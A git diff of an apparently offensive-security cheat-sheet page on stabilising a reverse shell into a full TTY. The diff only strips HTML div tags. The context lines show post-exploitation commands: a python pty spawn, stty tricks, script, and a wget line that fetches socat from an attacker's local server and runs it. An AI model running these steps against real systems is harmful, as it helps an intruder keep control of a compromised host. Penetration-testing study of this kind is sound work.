@@ -8,8 +8,6 @@ tags: ["shell", "python", "bash", "sh", "tty"]
 
 #### Check installed binaries
 
-<div>
-
 ```console
 which sh
 ```
@@ -26,14 +24,10 @@ which python3
 which python
 ```
 
-</div>
-
 {{< tab set1 tab1 active >}}python{{< /tab >}}
 {{< tab set1 tab2 >}}socat{{< /tab >}}
 {{< tab set1 tab3 >}}script{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
-
-<div>
 
 ```console
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -49,12 +43,8 @@ stty raw -echo; fg
 export TERM=xterm-256color
 ```
 
-</div>
-
 {{< /tabcontent >}}
 {{< tabcontent set1 tab2 >}}
-
-<div>
 
 ```console
 # Start a local http server
@@ -76,21 +66,13 @@ wget -q http://<LOCAL_IP>/socat -O /tmp/socat && chmod +x /tmp/socat && /tmp/soc
 export TERM=xterm-256color
 ```
 
-</div>
-
 <small>*Ref: [Download socat](https://github.com/3ndG4me/socat)*</small>
 
 {{< /tabcontent >}}
 {{< tabcontent set1 tab3 >}}
 
-<div>
-
 ```console
 script -qc /bin/bash /dev/null
 ```
 
-</div>
-
 {{< /tabcontent >}}
-
-<br>
